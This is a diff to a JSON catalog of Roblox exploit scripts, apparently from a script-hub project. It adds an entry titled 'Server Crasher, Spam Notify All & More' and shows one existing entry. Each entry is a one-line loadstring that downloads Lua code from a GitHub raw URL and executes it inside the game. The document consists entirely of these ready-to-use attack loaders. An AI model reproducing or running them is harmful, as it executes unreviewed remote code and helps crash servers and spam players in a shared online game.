@@ -1202,5 +1202,12 @@
             "loadstring": "loadstring(game:HttpGet('https://raw.githubusercontent.com/5iREx/script/main/livetopia'))()",
             "credit": "wekilledtheunicorns"
         }
+    ],
+    "8481844229": [
+        {
+            "name": "Server Crasher, Spam Notify All & More",
+            "loadstring": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Venera0/mix/main/77_CQYRKT1H.lua'))()",
+            "credit": "wekilledtheunicorns"
+        }
     ]
 }
